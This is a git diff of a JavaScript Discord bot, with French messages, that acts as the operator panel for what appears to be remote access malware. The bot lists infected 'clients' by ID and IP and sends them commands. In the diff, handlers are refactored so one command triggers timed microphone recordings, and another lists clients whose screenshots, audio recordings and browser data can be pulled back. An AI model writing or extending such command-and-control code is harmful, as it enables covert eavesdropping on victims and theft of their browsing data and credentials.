@@ -46,61 +46,57 @@ export const handleClientsCommand = async (interaction) => {
     }
 };
 
-export const handleMicrophoneCommand = async (interaction) => {
-    const clientId = interaction.options.getString('client_id');
-    const duration = interaction.options.getInteger('duration');
-    await interaction.deferReply({ ephemeral: true });
-
-    const url = `${API_BASE_URL}/command/${clientId}`;
-    const data = {
-        command: 'audio',
-        params: { duration }
-    };
-
-    try {
-        await executeRequestWithTokenRefresh(url, { method: 'POST', data });
-        await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId}...`);
-
-        let elapsedSeconds = 0;
-        const intervalId = setInterval(async () => {
-            elapsedSeconds++;
-            const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
-            await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
-            if (elapsedSeconds >= duration) {
-                clearInterval(intervalId);
-                await interaction.editReply(`Enregistrement audio terminé pour le client ${clientId}.`);
-            }
-        }, 1000);
-
-    } catch (error) {
-        console.error("Erreur lors de l'envoi de la commande d'enregistrement audio", error);
-        await interaction.editReply("Erreur lors de l'envoi de la commande d'enregistrement audio.");
-        clearInterval(intervalId);
-    }
-};
-
 export const handleSendCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     const command = interaction.options.getString('command');
-    const args = interaction.options.getString('args');
+    const duration = interaction.options.getInteger('duration') || 10;
+
     await interaction.deferReply({ ephemeral: true });
 
     const url = `${API_BASE_URL}/command/${clientId}`;
-    const data = {
+    let data = {
         command: command
     };
 
+    if (command === 'microphone' && duration) {
+        data.params = { duration };
+    } else if (command === 'microphone' && !duration) {
+        await interaction.editReply("Veuillez spécifier une durée pour l'enregistrement audio.");
+        return;
+    }
+
     try {
         await executeRequestWithTokenRefresh(url, { method: 'POST', data });
-        await interaction.editReply(`Commande envoyée au client ${clientId} : ${command}`);
+        if (command === 'microphone') {
+            await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId} pour ${duration} secondes...`);
+            let elapsedSeconds = 0;
+            const intervalId = setInterval(async () => {
+                elapsedSeconds++;
+                const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
+                await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
+                if (elapsedSeconds >= duration) {
+                    clearInterval(intervalId);
+                    await interaction.editReply(`Enregistrement audio terminé pour le client ${clientId}.`);
+                }
+            }, 1000);
+        } else {
+            await interaction.editReply(`Commande '${command}' envoyée au client ${clientId}.`);
+        }
     } catch (error) {
-        console.error("Erreur lors de l'envoi de la commande", error);
-        await interaction.editReply("Erreur lors de l'envoi de la commande.");
+        if (error.response.data.message.includes("hors ligne")) {
+            await interaction.editReply("Le client est hors ligne.");
+        } else {
+            console.error("Erreur lors de l'envoi de la commande", error);
+            await interaction.editReply("Erreur lors de l'envoi de la commande.");
+        }
     }
-}
+};
 
-export const handleListAllScreenshotsCommand = async (interaction) => {
+export const handleListDataCommand = async (interaction) => {
+    const type = interaction.options.getString('type');
+    const browser = interaction.options.getString('browser') || null;
     await interaction.deferReply({ ephemeral: true });
+
     try {
         const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
         const clients = response.data;
@@ -112,7 +108,7 @@ export const handleListAllScreenshotsCommand = async (interaction) => {
 
         const buttons = clients.map(client =>
             new ButtonBuilder()
-                .setCustomId(`screenshot_${client.id}`)
+                .setCustomId(`${type}_${client.id}_${browser}`)
                 .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
                 .setStyle(1)
         );
@@ -123,69 +119,23 @@ export const handleListAllScreenshotsCommand = async (interaction) => {
             components.push(actionRow);
         }
 
-        await interaction.editReply({ content: "Sélectionnez un client pour voir les captures d'écran :", components });
+        let content = '';
+        switch (type) {
+            case 'screenshot':
+                content = "Sélectionnez un client pour voir les captures d'écran :";
+                break;
+            case 'microphone':
+                content = "Sélectionnez un client pour voir les enregistrements audio :";
+                break;
+            case 'browserdata':
+                content = "Sélectionnez un client pour voir les données de navigation :";
+                break;
+        }
+
+        await interaction.editReply({content, components});
+
     } catch (error) {
         console.error("Erreur lors de la récupération des clients", error);
         await interaction.editReply("Erreur lors de la récupération des clients.");
-    }
-};
-
-export const handleListAllMicrophonesCommand = async (interaction) => {
-    await interaction.deferReply({ ephemeral: true });
-    try {
-        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
-        const clients = response.data;
-
-        if (clients.length === 0) {
-            await interaction.editReply("Aucun client disponible.");
-            return;
-        }
-
-        const buttons = clients.map(client =>
-            new ButtonBuilder()
-                .setCustomId(`microphone_${client.id}`)
-                .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
-                .setStyle(1)
-        );
-
-        const components = [];
-        for (let i = 0; i < buttons.length; i += 5) {
-            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
-            components.push(actionRow);
-        }
-
-        await interaction.editReply({ content: "Sélectionnez un client pour voir les enregistrements audio :", components });
-    } catch (error) {
-        console.error("Erreur lors de la récupération des clients", error);
-        await interaction.editReply("Erreur lors de la récupération des clients.");
-    }
-};
-
-export const handleListBrowserDataCommand = async (interaction) => {
-    await interaction.deferReply({ ephemeral: true });
-    try {
-        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/client/${interaction.options.getString('client_id')}/${interaction.options.getString('browser')}`);
-        const browserData = response.data;
-
-        if (browserData.length === 0) {
-            await interaction.editReply("Aucune donnée de navigation disponible pour ce client.");
-            return;
-        }
-
-        const files = [];
-        for (const data of browserData) {
-            const responseFile = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/data/${data.id}`, { responseType: 'text' });
-            let filename = `${data.file_path.split('/').pop()}`;
-            files.push({ attachment: Buffer.from(responseFile.data, 'utf-8'), name: `${filename}` });
-        }
-
-        await interaction.editReply({
-            content: `Données de navigation pour le client ${interaction.options.getString('client_id')} :`,
-            files: files
-        });
-    }
-    catch (error) {
-        console.error("Erreur lors de la récupération des données de navigation", error);
-        await interaction.editReply("Erreur lors de la récupération des données de navigation.");
     }
 }
